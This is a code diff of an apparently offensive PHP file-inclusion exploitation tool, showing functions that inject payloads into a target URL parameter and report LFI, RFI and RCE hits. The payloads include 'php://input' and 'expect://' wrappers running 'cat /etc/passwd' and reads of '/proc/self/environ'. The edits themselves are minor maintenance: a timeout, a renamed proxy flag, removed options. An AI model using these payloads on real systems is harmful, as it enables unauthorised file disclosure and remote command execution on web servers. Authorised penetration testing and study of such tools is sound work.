@@ -177,7 +177,6 @@ def test_data_wrapper(url):
             getExploit(res, 'GET', 'LFI', u, '', headers)
             print("[+] LFI -> " + u)
 
-#OK
 def test_php_input(url):
     testL = []
     testL.append("php://input&cmd=cat%20/etc/passwd")
@@ -222,7 +221,6 @@ def test_php_input(url):
                 getExploit(res, 'POST', 'RCE', u, posts[l], headers)
                 print("[+] RCE -> " + u + " -> HTTP POST: " + posts[l])
 
-#OK
 def test_expect_wrapper(url):
     testL = []
     testL.append("expect://cat%20%2Fetc%2Fpasswd")
@@ -260,7 +258,6 @@ def test_expect_wrapper(url):
             getExploit(res, 'GET', 'RCE', u, testW[j], headers)
             print("[+] RCE -> " + u)
 
-#OK
 def test_rfi(url):
     tests = []
     tests.append("https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2FREADME.md")
@@ -274,7 +271,7 @@ def test_rfi(url):
                 print("[+] RFI -> " + u)
         except:
             pass
-
+#TODO
 def test_environ(url):
     tests = []
     tests.append("/proc/self/environ")
@@ -284,7 +281,7 @@ def test_environ(url):
             u = url.replace("DESTROY", tests[i])
             
             try:
-                res = requests.get(u, headers = headers, proxies = proxies)
+                res = requests.get(u, headers = headers, proxies = proxies, timeout = 2)
             except:
                 print("Proxy problem... Exiting now.")
                 sys.exit(-1)
@@ -292,6 +289,7 @@ def test_environ(url):
             if(checkPayload(res)):
                 getExploit(res, 'GET', 'LFI', u, tests[i], headers)
                 print("[+] LFI -> " + u)
+
 
 #You can add custom patterns in responses depending on the wordlist used
 #Checks if sent payload is executed
@@ -384,7 +382,7 @@ if(__name__ == "__main__"):
     optionsGroup = parser.add_argument_group('GENERAL')
     optionsGroup.add_argument('url', type=str, metavar="URL", help="""\t\t Specify url, Ex: "http://example.org/vuln.php?param=DESTROY" ###DONE""")
     optionsGroup.add_argument('-c', type=str, metavar="<cookie>", dest='cookie', help='\t\t Specify session cookie, Ex: "PHPSESSID=1943785348b45" ###DONE')
-    optionsGroup.add_argument('--proxy-address', type=str, metavar = "<address>", dest="proxyAddr", help="\t\t Specify Proxy IP address. Ex: '10.10.10.10:8080' ###DONE")
+    optionsGroup.add_argument('-p', '--proxy', type=str, metavar = "<address>", dest="proxyAddr", help="\t\t Specify Proxy IP address. Ex: '10.10.10.10:8080' ###DONE")
     optionsGroup.add_argument('--useragent', type=str, metavar= '<agent>', dest="agent", help="\t\t Specify HTTP user agent ###DONE")
     optionsGroup.add_argument('--referer', type=str, metavar = '<referer>', dest='referer', help="\t\t Specify HTTP referer ###DONE")
     
@@ -393,8 +391,6 @@ if(__name__ == "__main__"):
     attackGroup.add_argument('--php-input', action="store_true", dest = 'php_input', help="\t\t Attack using php input wrapper ###DONE")
     attackGroup.add_argument('--php-data', action="store_true", dest = 'php_data', help="\t\t Attack using php data wrapper ###DONE")
     attackGroup.add_argument('--php-expect', action="store_true", dest = 'php_expect', help="\t\t Attack using php expect wrapper ###DONE")
-    attackGroup.add_argument('--php-zip', action = "store_true", dest= 'php_zip', help="\t\t Attack using php zip wrapper")
-    attackGroup.add_argument('--php-session', action="store_true", dest= "php_session", help="\t\t Attack using session id injection")
     attackGroup.add_argument('--phpinfo-race', action="store_true", dest="phpinfo_race", help="\t\t Attack using phpinfo race condition")
     attackGroup.add_argument('--log-poison', action="store_true", dest="log_poison", help="\t\t Attack using log file poisoning")
     attackGroup.add_argument('--self-fd', action="store_true", dest="self_fd", help="\t\t Attack using '/proc/self/fd' technique")
